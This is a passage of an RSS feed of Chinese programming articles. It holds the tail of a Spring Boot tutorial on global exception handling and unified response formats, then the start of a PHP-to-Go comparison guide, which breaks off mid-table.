&lt;span&gt;&quot;/wrong&quot;&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这种数据格式返回给前端，前端是看不懂的，所以这时候我们一般通过&lt;code&gt;try...catch&lt;/code&gt;来处理异常&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;/wrong&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; &lt;span&gt;error&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;int&lt;/span&gt; i;&lt;br/&gt;    &lt;span&gt;try&lt;/span&gt;{&lt;br/&gt;        i = &lt;span&gt;9&lt;/span&gt;/&lt;span&gt;0&lt;/span&gt;;&lt;br/&gt;    }&lt;span&gt;catch&lt;/span&gt; (Exception e){&lt;br/&gt;        log.error(&lt;span&gt;&quot;error:{}&quot;&lt;/span&gt;,e);&lt;br/&gt;        i = &lt;span&gt;0&lt;/span&gt;;&lt;br/&gt;    }&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; i;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们追求的目标肯定是不需要再手动写&lt;code&gt;try...catch&lt;/code&gt;了，而是希望由全局异常处理器处理。&lt;/p&gt;&lt;ol start=&quot;2&quot; data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;对于自定义异常，只能通过全局异常处理器来处理&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;error1&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;empty&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt; &lt;span&gt;throw&lt;/span&gt;  &lt;span&gt;new&lt;/span&gt; RuntimeException(&lt;span&gt;&quot;自定义异常&quot;&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&quot;3&quot; data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;当我们引入Validator参数校验器的时候，参数校验不通过会抛出异常，此时是无法用&lt;code&gt;try...catch&lt;/code&gt;捕获的，只能使用全局异常处理器。&lt;/p&gt;&lt;blockquote&gt;&lt;span&gt;“&lt;/span&gt;&lt;p&gt;SpringBoot集成参数校验请参考这篇文章&lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzAwMTk4NjM1MA==&amp;amp;mid=2247490888&amp;amp;idx=1&amp;amp;sn=dd7c3a4feb185abdca42362000b336d3&amp;amp;chksm=9ad00709ada78e1f04f0d878e03625083abccb5f72b6ae473c6816e2039edf245fe4ac6f50a6&amp;amp;scene=21#wechat_redirect&quot; textvalue=&quot;SpringBoot开发秘籍 - 集成参数校验及高阶技巧&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;SpringBoot开发秘籍 - 集成参数校验及高阶技巧&lt;/a&gt;&lt;/p&gt;&lt;span&gt;”&lt;/span&gt;&lt;/blockquote&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;如何实现全局异常处理器&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@Slf&lt;/span&gt;4j&lt;br/&gt;&lt;span&gt;@RestControllerAdvice&lt;/span&gt;&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;RestExceptionHandler&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;/**&lt;br/&gt;     * 默认全局异常处理。&lt;br/&gt;     * &lt;span&gt;@param&lt;/span&gt; e the e&lt;br/&gt;     * &lt;span&gt;@return&lt;/span&gt; ResultData&lt;br/&gt;     */&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;@ExceptionHandler&lt;/span&gt;(Exception&lt;span&gt;.&lt;span&gt;class&lt;/span&gt;)&lt;br/&gt;    @&lt;span&gt;ResponseStatus&lt;/span&gt;(&lt;span&gt;HttpStatus&lt;/span&gt;.&lt;span&gt;INTERNAL_SERVER_ERROR&lt;/span&gt;)&lt;br/&gt;    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;ResultData&lt;/span&gt;&amp;lt;&lt;span&gt;String&lt;/span&gt;&amp;gt; &lt;span&gt;exception&lt;/span&gt;(&lt;span&gt;Exception&lt;/span&gt; &lt;span&gt;e&lt;/span&gt;) &lt;/span&gt;{&lt;br/&gt;        log.error(&lt;span&gt;&quot;全局异常信息 ex={}&quot;&lt;/span&gt;, e.getMessage(), e);&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; ResultData.fail(ReturnCode.RC500.getCode(),e.getMessage());&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;有三个细节需要说明一下：&lt;/p&gt;&lt;ol data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;@RestControllerAdvice&lt;/code&gt;，RestController的增强类，可用于实现全局异常处理器&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;@ExceptionHandler&lt;/code&gt;,统一处理某一类异常，从而减少代码重复率和复杂度，比如要获取自定义异常可以&lt;code&gt;@ExceptionHandler(BusinessException.class)&lt;/code&gt;&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;@ResponseStatus&lt;/code&gt;指定客户端收到的http状态码&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;体验效果&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这时候我们调用如下接口：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;error1&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;empty&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;throw&lt;/span&gt;  &lt;span&gt;new&lt;/span&gt; RuntimeException(&lt;span&gt;&quot;自定义异常&quot;&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;返回的结果如下：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;  &lt;span&gt;&quot;status&quot;&lt;/span&gt;: &lt;span&gt;500&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;message&quot;&lt;/span&gt;: &lt;span&gt;&quot;自定义异常&quot;&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;data&quot;&lt;/span&gt;: &lt;span&gt;null&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;timestamp&quot;&lt;/span&gt;: &lt;span&gt;1625795902556&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;基本满足我们的需求了。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;但是当我们同时启用统一标准格式封装功能&lt;code&gt;ResponseAdvice&lt;/code&gt;和&lt;code&gt;RestExceptionHandler&lt;/code&gt;全局异常处理器时又出现了新的问题：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;  &lt;span&gt;&quot;status&quot;&lt;/span&gt;: &lt;span&gt;100&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;message&quot;&lt;/span&gt;: &lt;span&gt;&quot;操作成功&quot;&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;data&quot;&lt;/span&gt;: {&lt;br/&gt;    &lt;span&gt;&quot;status&quot;&lt;/span&gt;: &lt;span&gt;500&lt;/span&gt;,&lt;br/&gt;    &lt;span&gt;&quot;message&quot;&lt;/span&gt;: &lt;span&gt;&quot;自定义异常&quot;&lt;/span&gt;,&lt;br/&gt;    &lt;span&gt;&quot;data&quot;&lt;/span&gt;: &lt;span&gt;null&lt;/span&gt;,&lt;br/&gt;    &lt;span&gt;&quot;timestamp&quot;&lt;/span&gt;: &lt;span&gt;1625796167986&lt;/span&gt;&lt;br/&gt;  },&lt;br/&gt;  &lt;span&gt;&quot;timestamp&quot;&lt;/span&gt;: &lt;span&gt;1625796168008&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;此时返回的结果是这样，统一格式增强功能会给返回的异常结果再次封装，所以接下来我们需要解决这个问题。&lt;/p&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;全局异常接入返回的标准格式&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;要让全局异常接入标准格式很简单，因为全局异常处理器已经帮我们封装好了标准格式，我们只需要直接返回给客户端即可。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@SneakyThrows&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; Object &lt;span&gt;beforeBodyWrite&lt;/span&gt;&lt;span&gt;(Object o, MethodParameter methodParameter, MediaType mediaType, Class&amp;lt;? extends HttpMessageConverter&amp;lt;?&amp;gt;&amp;gt; aClass, ServerHttpRequest serverHttpRequest, ServerHttpResponse serverHttpResponse)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;  &lt;span&gt;if&lt;/span&gt;(o &lt;span&gt;instanceof&lt;/span&gt; String){&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; objectMapper.writeValueAsString(ResultData.success(o));&lt;br/&gt;  }&lt;br/&gt;  &lt;span&gt;if&lt;/span&gt;(o &lt;span&gt;instanceof&lt;/span&gt; ResultData){&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; o;&lt;br/&gt;  }&lt;br/&gt;  &lt;span&gt;return&lt;/span&gt; ResultData.success(o);&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;关键代码：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;if&lt;/span&gt;(o &lt;span&gt;instanceof&lt;/span&gt; ResultData){&lt;br/&gt;  &lt;span&gt;return&lt;/span&gt; o;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果返回的结果是ResultData对象，直接返回即可。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这时候我们再调用上面的错误方法，返回的结果就符合我们的要求了。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;  &lt;span&gt;&quot;status&quot;&lt;/span&gt;: &lt;span&gt;500&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;message&quot;&lt;/span&gt;: &lt;span&gt;&quot;自定义异常&quot;&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;data&quot;&lt;/span&gt;: &lt;span&gt;null&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;timestamp&quot;&lt;/span&gt;: &lt;span&gt;1625796580778&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;好了，今天的文章就到这里了，希望通过这篇文章你能掌握如何在你项目中友好实现统一标准格式到返回并且可以优雅的处理全局异常。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;github地址：https://github.com/jianzh5/cloud-blog/&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;最后，我是飘渺Jam，一名写代码的架构师，做架构的程序员，期待你的关注。咱们下期见！&lt;/p&gt;&lt;/section&gt;
                &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>222ee5f44c264ec4b959b0bd17bf1172</guid>
<title>PHP 转 Go 速学手册</title>
<link>https://toutiao.io/k/d52lqdy</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content &quot; id=&quot;js_content&quot;&gt;
                    

                    
                    
                    
                    &lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-croporisrc=&quot;https://mmbiz.qlogo.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMen5rzMl1aPs0DrQ5QM1LEkibSEBysTibfcus40K5M19yoJzTdQS74BjqA/0?wx_fmt=png&quot; data-cropx1=&quot;0&quot; data-cropx2=&quot;1280&quot; data-cropy1=&quot;102.11502782931355&quot; data-cropy2=&quot;579.443413729128&quot; data-ratio=&quot;0.37265625&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_jpg/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeP9iaUP0OVwSdMRoF30MJkbkzFjYCxib8oRPq3zGuLfuAsmxVN8kwPcSA/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1280&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages js_insertlocalimg&quot; data-croporisrc=&quot;https://mmbiz.qlogo.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeV2AhIE1vBglSvOp1mWs819DLzpE9Q9BvBliaFlFCQh4kCRticyPSuLCQ/0?wx_fmt=png&quot; data-cropx1=&quot;0&quot; data-cropx2=&quot;1280&quot; data-cropy1=&quot;126.22837370242216&quot; data-cropy2=&quot;640&quot; data-ratio=&quot;0.40078125&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_jpg/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeWpTnTqsHcYU1HQOcGQ7vAqdkej2u5lGeWeBZfjDibGPecicjwQFsf7ng/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1280&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section class=&quot;code-snippet__fix code-snippet__js&quot;&gt;&lt;pre class=&quot;code-snippet__js&quot; data-lang=&quot;javascript&quot;&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;链接🔗 http:&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/section&gt;&lt;h1 data-line=&quot;13&quot;&gt;&lt;span&gt;前言&lt;/span&gt;&lt;br/&gt;&lt;/h1&gt;&lt;p data-line=&quot;15&quot;&gt;&lt;span&gt;整理了一份简要的手册，帮助大家高效的上手Go语言，主要是通过对比PHP和Go的不同点来强化理解，内容主要分为以下四部分：&lt;/span&gt;&lt;/p&gt;&lt;h1 data-line=&quot;22&quot;&gt;&lt;span&gt;语言层面差异&lt;/span&gt;&lt;/h1&gt;&lt;pre&gt;&lt;code data-line=&quot;24&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;备注：下文基于PHP主流php-fpm模式。&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;span&gt;对比项&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;PHP&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;Go&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;字符串表示&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;单引号(PSR)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;双引号&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;拼接字符串&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;.&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;+&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;语言版本兼容性&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;不好&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;向下兼容&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;代码风格&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;无官方标准，社区标准起步晚&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;自始至今官方统一标准，且提供工具&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;脚本语言&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;不是&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;强类型语言&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;不是(PHP7支持严格模式)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;是否支持垃圾回收&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;面向对象语言(OOP)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;神似&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;部分支持，核心是合成复用&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;是否支持继承&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;否(有合成复用)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;是否支持interface&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;是否支持try...catch...&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;否&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;是否支持包管理&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;是否支持跨平台&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;环境搭建成本&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;高&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;低&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;执行方式&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;cli命令行模式、php-fpm模式(①)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;二进制&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;进程模型&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;多进程&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;单进程&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;原生是否支持创建TCP/UDP服务&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是(支持不好，生产不可用)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;原生是否支持创建HTTP服务&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是(支持不好，生产不可用)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;进程阻塞性&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;否&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;是否支持协程&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;否(②)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;并发能力(③)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;弱&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;极强&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;是否常驻内存运行&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;不是(④)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;引入文件方式&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;require&lt;/span&gt;&lt;/code&gt;&lt;span&gt;或者&lt;/span&gt;&lt;code&gt;&lt;span&gt;include&lt;/span&gt;&lt;/code&gt;&lt;span&gt;对应文件&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;import&lt;/span&gt;&lt;/code&gt;&lt;span&gt;导入包&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;是否支持单元测试&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;是否支持基准测试(benchmark)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;否&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;是否支持性能分析&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;支持(xhprof/tideways)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;支持(pprof/dlv)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;性能分析工具使用成本&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;高(装扩展成本高)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;极低&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;pre&gt;&lt;code data-line=&quot;58&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;①其他模式还有swoole等&lt;br/&gt;②PHP的swoole协程框架等支持协程&lt;br/&gt;③此处不考虑I/O多路复用，PHP的swoole协程框架等也支持协程并发&lt;br/&gt;④PHP的swoole协程框架是常驻内存，cli命令行模式也可以常驻内存等&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;65&quot;&gt;&lt;span&gt;刚开始由PHP语言转Go语言的过程，重点是编程意识的转变，尤其是以下几点：&lt;/span&gt;&lt;/p&gt;&lt;ul class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;强类型&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;常驻内存运行&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;理解和使用指针&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;并发安全&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;资源及时释放或返还&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h1 data-line=&quot;72&quot;&gt;&lt;span&gt;基础语法差异&lt;/span&gt;&lt;/h1&gt;&lt;pre&gt;&lt;code data-line=&quot;74&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;备注：下文基于PHP5.4+版本&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;77&quot;&gt;&lt;span&gt;常用基本类型对比&lt;/span&gt;&lt;/h2&gt;&lt;p data-line=&quot;79&quot;&gt;&lt;span&gt;PHP类型比较少和简单，PHP常用数据类型有boolean布尔值、string字符串、int整型、float浮点型、array数组、object对象。&lt;/span&gt;&lt;/p&gt;&lt;p data-line=&quot;81&quot;&gt;&lt;span&gt;PHP常用数据类型和Go语言对应或者类似的类型做个对比，如下：&lt;/span&gt;&lt;/p&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;span&gt;语言\类型&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;boolean&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;string&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;int&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;float&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;array&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;object&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;PHP&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;bool&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;string&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;int&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;float&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;array(1,2,3)索引数组、array(&#x27;1&#x27; =&amp;gt; 1, &#x27;2&#x27; =&amp;gt; 2, &#x27;3&#x27; =&amp;gt; 